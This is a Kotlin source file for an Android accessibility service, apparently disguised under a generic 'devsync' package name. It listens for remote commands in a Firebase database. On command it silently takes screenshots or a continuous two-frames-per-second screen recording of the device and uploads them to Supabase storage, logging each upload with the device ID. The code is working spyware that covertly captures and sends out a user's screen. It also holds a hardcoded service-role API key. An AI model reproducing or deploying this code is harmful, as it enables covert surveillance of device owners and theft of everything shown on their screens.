package com.example.devsync

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.graphics.Bitmap
import android.os.Build
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.database.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.Executor

class ScreenshotService : AccessibilityService() {

    companion object {
        const val DB_URL       = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
        const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
        const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6c2xyaWJqemxpZXdweWF0dGNsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc4OTY1NywiZXhwIjoyMDk0MzY1NjU3fQ.bZ2kCJesIeeTbZ5L1GrNzYAaDK5v3Ba8-R-SGWIU-A8"
        const val BUCKET_SS    = "screenshots"
        const val BUCKET_VID   = "videos"
        const val FPS          = 2           // 2 screenshots/sec
        const val CHUNK_SEC    = 30          // 30 sec per video
        const val FRAMES_PER_CHUNK = FPS * CHUNK_SEC  // 60 frames
    }

    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }
    private val database by lazy {
        FirebaseDatabase.getInstance(DB_URL).getReference("devices/$deviceId")
    }
    private val regRef by lazy {
        FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
    }
    private val http = OkHttpClient.Builder()
        .callTimeout(120, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    private var liveCapJob: Job? = null
    private var isLiveEnabled = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        }
        regRef.child("accessibility_granted").setValue(true)
        listenForCommands()
    }

    private fun listenForCommands() {
        // Single screenshot
        database.child("take_screenshot").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                if (s.exists() && s.getValue(Boolean::class.java) == true) {
                    database.child("take_screenshot").removeValue()
                    reportStatus("⏳ Taking screenshot...")
                    captureOne { bmp -> uploadScreenshot(bmp) }
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        })

        // Live capture toggle (2/sec → 30s video)
        database.child("live_capture_enabled").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val enabled = s.getValue(Boolean::class.java) ?: false
                if (enabled && !isLiveEnabled) {
                    isLiveEnabled = true
                    startLiveCapture()
                } else if (!enabled && isLiveEnabled) {
                    isLiveEnabled = false
                    liveCapJob?.cancel()
                    reportStatus("⏹ Live capture stopped")
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        })

        // Stop all
        database.child("stop_all").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                if (s.exists() && s.getValue(Boolean::class.java) == true) {
                    isLiveEnabled = false
                    liveCapJob?.cancel()
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        })
    }

    // ── SINGLE SCREENSHOT ─────────────────────────────────────────────────────

    private fun captureOne(onResult: (Bitmap) -> Unit) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            reportStatus("❌ Requires Android 11+"); return
        }
        val executor = Executor { it.run() }
        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, executor,
            object : TakeScreenshotCallback {
                override fun onSuccess(r: ScreenshotResult) {
                    val bmp = Bitmap.wrapHardwareBuffer(r.hardwareBuffer, r.colorSpace)
                        ?.copy(Bitmap.Config.ARGB_8888, false)
                    r.hardwareBuffer.close()
                    if (bmp != null) onResult(bmp)
                    else reportStatus("❌ Bitmap null")
                }
                override fun onFailure(code: Int) { reportStatus("❌ Capture failed: $code") }
            })
    }

    // ── LIVE CAPTURE ──────────────────────────────────────────────────────────

    private fun startLiveCapture() {
        liveCapJob = CoroutineScope(Dispatchers.Main).launch {
            while (isActive && isLiveEnabled) {
                val frames = mutableListOf<Bitmap>()
                reportStatus("🔴 Live capture: collecting frames...")

                // Collect FRAMES_PER_CHUNK frames at 2/sec
                repeat(FRAMES_PER_CHUNK) {
                    if (!isActive || !isLiveEnabled) return@repeat
                    captureOne { bmp -> frames.add(bmp) }
                    delay(1000L / FPS)
                }

                if (frames.size >= 10) {
                    reportStatus("🎬 Encoding ${frames.size} frames to video...")
                    withContext(Dispatchers.IO) {
                        encodeAndUpload(frames)
                    }
                    frames.forEach { it.recycle() }
                } else {
                    frames.forEach { it.recycle() }
                }
            }
        }
    }

    private fun encodeAndUpload(frames: List<Bitmap>) {
        try {
            val outFile = File(cacheDir, "live_${deviceId.takeLast(4)}_${System.currentTimeMillis()}.mp4")
            val ok = VideoEncoderHelper.encode(frames, FPS, outFile)
            if (ok && outFile.length() > 0) {
                uploadVideo(outFile)
            } else {
                reportStatus("❌ Video encoding failed")
            }
        } catch (e: Exception) {
            reportStatus("❌ Encode error: ${e.message?.take(80)}")
        }
    }

    private fun uploadVideo(file: File) {
        try {
            val fileName = "live_${deviceId.takeLast(6)}_${System.currentTimeMillis()}.mp4"
            val body = file.readBytes().toRequestBody("video/mp4".toMediaType())
            val req = Request.Builder()
                .url("$SUPABASE_URL/storage/v1/object/$BUCKET_VID/$fileName")
                .header("Authorization", "Bearer $SUPABASE_KEY")
                .header("apikey", SUPABASE_KEY)
                .header("Content-Type", "video/mp4")
                .header("x-upsert", "true")
                .post(body)
                .build()
            http.newCall(req).execute().use { resp ->
                if (resp.isSuccessful) {
                    val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_VID/$fileName"
                    FirebaseDatabase.getInstance(DB_URL)
                        .getReference("live_videos").push()
                        .setValue(mapOf(
                            "deviceId"  to deviceId,
                            "url"       to url,
                            "timestamp" to System.currentTimeMillis(),
                            "fileName"  to fileName
                        ))
                    reportStatus("🎬 Video uploaded ✅ (${file.length() / 1024}KB)")
                } else {
                    val err = resp.body?.string()?.take(100) ?: ""
                    reportStatus("❌ Video upload failed ${resp.code}: $err")
                }
            }
            file.delete()
        } catch (e: Exception) {
            reportStatus("❌ Video upload error: ${e.message?.take(80)}")
        }
    }

    // ── SINGLE SCREENSHOT UPLOAD ───────────────────────────────────────────────

    private fun uploadScreenshot(bitmap: Bitmap) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val stream = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, stream)
                val bytes = stream.toByteArray()
                val ts = System.currentTimeMillis()
                val fileName = "${deviceId}_$ts.jpg"
                val body = bytes.toRequestBody("image/jpeg".toMediaType())
                val req = Request.Builder()
                    .url("$SUPABASE_URL/storage/v1/object/$BUCKET_SS/$fileName")
                    .header("Authorization", "Bearer $SUPABASE_KEY")
                    .header("apikey", SUPABASE_KEY)
                    .header("Content-Type", "image/jpeg")
                    .header("x-upsert", "true")
                    .post(body)
                    .build()
                http.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) {
                        val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_SS/$fileName"
                        FirebaseDatabase.getInstance(DB_URL)
                            .getReference("screenshots").push()
                            .setValue(mapOf("deviceId" to deviceId, "url" to url, "timestamp" to ts))
                        reportStatus("📸 Screenshot uploaded ✅")
                    } else {
                        val err = resp.body?.string()?.take(120) ?: ""
                        reportStatus("❌ Upload ${resp.code}: $err")
                    }
                }
            } catch (e: Exception) {
                reportStatus("❌ Upload error: ${e.message?.take(80)}")
            }
        }
    }

    private fun reportStatus(status: String) {
        regRef.child("lastStatus").setValue(status)
        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() {}
    override fun onDestroy() {
        super.onDestroy()
        isLiveEnabled = false
        liveCapJob?.cancel()
        regRef.child("accessibility_granted").setValue(false)
    }
}
